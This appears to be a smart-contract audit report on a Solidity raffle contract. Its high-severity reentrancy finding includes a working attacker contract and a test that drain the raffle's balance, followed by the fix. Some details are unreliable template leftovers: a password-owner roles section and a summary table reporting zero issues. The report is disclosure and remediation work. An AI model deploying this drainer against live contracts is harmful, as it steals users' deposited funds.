---
title: Protocol Audit Report
author: Prince Allwin
date: February 10, 2024
header-includes:
  - \usepackage{titling}
  - \usepackage{graphicx}
---

\begin{titlepage}
    \centering
    \begin{figure}[h]
        \centering
    \end{figure}
    \vspace*{2cm}
    {\Huge\bfseries Protocol Audit Report\par}
    \vspace{1cm}
    {\Large Version 1.0\par}
    \vspace{2cm}
    {\Large\itshape Prince Allwin\par}
    \vfill
    {\large \today\par}
\end{titlepage}

\maketitle

<!-- Your report starts here! -->

Prepared by: [Prince Allwin]()
Lead Security Researches: 
- Prince Allwin

# Table of Contents
- [Table of Contents](#table-of-contents)
- [Protocol Summary](#protocol-summary)
- [Disclaimer](#disclaimer)
- [Risk Classification](#risk-classification)
- [Audit Details](#audit-details)
	- [Scope](#scope)
	- [Roles](#roles)
- [Executive Summary](#executive-summary)
	- [Issues found](#issues-found)
- [Findings](#findings)
	- [High](#high)
		- [\[H-1\] Reentrancy attack in `PuppyRaffle::refund` allows entrant to drain raffle balance.](#h-1-reentrancy-attack-in-puppyrafflerefund-allows-entrant-to-drain-raffle-balance)
	- [Medium](#medium)
	- [Low](#low)
		- [\[L-1\] `PuppyRaffle::getActivePlayerIndex` returns 0 for non-existent players and for players at index 0, causing a player at index 0 to incorrectly think they have not entered the raffle.](#l-1-puppyrafflegetactiveplayerindex-returns-0-for-non-existent-players-and-for-players-at-index-0-causing-a-player-at-index-0-to-incorrectly-think-they-have-not-entered-the-raffle)
	- [Gas](#gas)
		- [\[G-1\] Unchanged state variable should be declared constant or immutable.](#g-1-unchanged-state-variable-should-be-declared-constant-or-immutable)
		- [\[G-2\] Storage variables in a loop should be cached.](#g-2-storage-variables-in-a-loop-should-be-cached)
	- [Informational](#informational)
		- [\[I-1\] Solidity pragma should be specific, not wide](#i-1-solidity-pragma-should-be-specific-not-wide)
		- [\[I-2\] Using an outdated version of solidity is not recommended.](#i-2-using-an-outdated-version-of-solidity-is-not-recommended)
		- [\[I-3\] Missing checks for `address(0)` when assigning values to address state variables](#i-3-missing-checks-for-address0-when-assigning-values-to-address-state-variables)

# Protocol Summary


# Disclaimer

Prince Allwin and team makes all effort to find as many vulnerabilities in the code in the given time period, but holds no responsibilities for the findings provided in this document. A security audit by the team is not an endorsement of the underlying business or product. The audit was time-boxed and the review of the code was solely on the security aspects of the Solidity implementation of the contracts.

# Risk Classification

|            |        | Impact |        |     |
| ---------- | ------ | ------ | ------ | --- |
|            |        | High   | Medium | Low |
|            | High   | H      | H/M    | M   |
| Likelihood | Medium | H/M    | M      | M/L |
|            | Low    | M      | M/L    | L   |

We use the [CodeHawks](https://docs.codehawks.com/hawks-auditors/how-to-evaluate-a-finding-severity) severity matrix to determine severity. See the documentation for more details.

# Audit Details 

Commit Hash:
```
```

## Scope 

./src/

## Roles

- Owner: The user who can set the password and read the password.
- Outsiders: No one else should be able to set or read the password.

# Executive Summary

## Issues found

| Severity | Number of issues found |
| -------- | ---------------------- |
| High     | 0                      |
| Medium   | 0                      |
| Low      | 0                      |
| Gas      | 0                      |
| Info     | 0                      |
|          |                        |
| Total    | 0                      |


# Findings

## High

### [H-1] Reentrancy attack in `PuppyRaffle::refund` allows entrant to drain raffle balance.

**Description:** The `PuppyRaffle::refund` function does not follow CEI (Checks, Effects, Interactions) and as a result, enables participants to drain the contract balance.

In the `PuppyRaffle::refund` function, we first make an external call to the `msg.sender` address and only after making that external call, we update the `PuppyRaffle::players`

```js
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

@>      payable(msg.sender).sendValue(entranceFee);
@>      players[playerIndex] = address(0);

        emit RaffleRefunded(playerAddress);
    }
```

A player who has entered the raffle could have a `fallback`/`receive` function that calls the `PuppyRaffle::refund` function again and claim another refund. They could continue the cycle till the contract balance is drained.

**Impact:** All fees paid by raffle entrants could be stoken by the malicious participant.

**Proof of Concept:**

1. User enters the raffle.
2. Attacker sets up a contract with a `fallback` function that calls `PuppyRaffle::refund`.
3. Attacker enters the raffle.
4. Attacker calls `PuppyRaffle::refund` from their attack contract, draining the contract balance.

<details>
<summary>Poc</summary>

Place the following in `PuppyRaffleTest.t.sol`

```js
    function test_Reentrancy() public {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        uint256 raffleBalanceBefore = address(puppyRaffle).balance;

        ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);

        address attackUser = makeAddr("attackUser");
        vm.deal(attackUser, 1 ether);

        uint256 startingAttackContractBalance = address(attackerContract).balance;

        vm.startPrank(attackUser);
        attackerContract.attack{value: entranceFee}();
        vm.stopPrank();
        // attacker has entered the raffle.

        uint256 endingAttackContractBalance = address(attackerContract).balance;
        uint256 raffleBalanceAfterAttack = address(puppyRaffle).balance;

        console.log("Starting attacker contract balance: ", startingAttackContractBalance);
        console.log("Starting Raffle Balance", raffleBalanceBefore);

        console.log("Ending attacker contract balance: ", endingAttackContractBalance);
        console.log("Raffle Balance After Attack", raffleBalanceAfterAttack);

        assertEq(endingAttackContractBalance, startingAttackContractBalance + 5 ether, "attackerContractBalance");
        assertEq(raffleBalanceAfterAttack, 0);
    }
```

And this contract as well

```js
	contract ReentrancyAttacker {
        PuppyRaffle private immutable i_victimContract;
        uint256 private immutable i_entranceFee;
        uint256 private s_attackerIndex;

        constructor(PuppyRaffle victimContract) {
            i_victimContract = PuppyRaffle(victimContract);
            i_entranceFee = victimContract.entranceFee();
        }

        function attack() external payable {
            address[] memory players = new address[](1);
            players[0] = address(this);
            i_victimContract.enterRaffle{value: i_entranceFee}(players);

            s_attackerIndex = i_victimContract.getActivePlayerIndex(address(this));
            i_victimContract.refund(s_attackerIndex);
        }

        function _stealMoney() internal {
            if (address(i_victimContract).balance > 0) {
                i_victimContract.refund(s_attackerIndex);
            }
        }

        receive() external payable {
            _stealMoney();
        }

        fallback() external payable {
            _stealMoney();
        }
    }
```

</details>

**Recommended Mitigation:** To prevent this, we should have the `PuppyRaffle::refund` function update the `players` array before making the external call. Additionally, we should move the event emission up as well.

- By following the above steps we are statisfying CEI.

```diff
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

+       players[playerIndex] = address(0);
+       emit RaffleRefunded(playerAddress);

       	payable(msg.sender).sendValue(entranceFee);

-		players[playerIndex] = address(0);
-       emit RaffleRefunded(playerAddress);
    }
```

- Also, Reentrancy Guard from [Openzeppelin](https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard) can be used.


## Medium

## Low

### [L-1] `PuppyRaffle::getActivePlayerIndex` returns 0 for non-existent players and for players at index 0, causing a player at index 0 to incorrectly think they have not entered the raffle.

**Description:** If a player is in the `PuppyRaffle::players` array at index 0, this will return 0, but according to the natspec, it will also return 0 if the player is not in the array.

```js
@>	/// @return the index of the player in the array, if they are not active, it returns 0
	function getActivePlayerIndex(address player) external view returns (uint256) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return i;
            }
        }
@>      return 0;
    }
```

**Impact:** A player at index 0 may incorrectly think they have not entered the raffle, and attempt to enter the raffle again, wasting gas.

**Proof of Concept:**

1. User enters the raffle, they are the first entrant.
2. `PuppyRaffle::getActivePlayerIndex` returns 0.
3. User thinks they have not entered correctly due to the function documentation.

**Recommended Mitigation:** The easiest recommendation would be to revert if the player is not in the array instead of returning 0.

You could also reserve the 0th position for any competition, but a better soultion might be to return an `int256` where the function returns `-1` if the player is not active.

## Gas

### [G-1] Unchanged state variable should be declared constant or immutable.

Instances:
- `PuppyRaffle::raffleDuration` should be `immutable`
- `PuppyRaffle::commonImageUri` should be `constant`
- `PuppyRaffle::rareImageUri` should be `constant`
- `PuppyRaffle::legendaryImageUri` should be `constant`

Reading from storage is much more expensive than reading from a constant or immutable variable.

### [G-2] Storage variables in a loop should be cached.

Everytime you call `players.length` you read from storage, as opposed from memory which is more gas efficient.

```diff
+   uint256 playersLength = players.length;
-   for (uint256 i = 0; i < players.length - 1; i++) {
+   for (uint256 i = 0; i < playersLength - 1; i++) {
-       for (uint256 j = i + 1; j < players.length; j++) {
+       for (uint256 j = i + 1; j < playersLength; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
```

## Informational

### [I-1] Solidity pragma should be specific, not wide

Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`

### [I-2] Using an outdated version of solidity is not recommended.

**Description:** solc frequently releases new compiler versions. Using an old version prevents access to new Solidity security checks. We also recommend avoiding complex pragma statement.

**Recommendation:** Deploy with any of the following Solidity versions:

`0.8.18`
The recommendations take into account:
- Risks related to recent releases
- Risks of complex code generation changes
- Risks of new language features
- Risks of known bugs
- Use a simple pragma version that allows any of these versions. Consider using the latest version of Solidity for testing.

Please see [Slither](https://github.com/crytic/slither/wiki/Detector-Documentation#incorrect-versions-of-solidity) documentation for more information.

### [I-3] Missing checks for `address(0)` when assigning values to address state variables

Assigning values to address state variables without checking for `address(0)`.

Instances:
`PuppyRaffle::feeAddress`

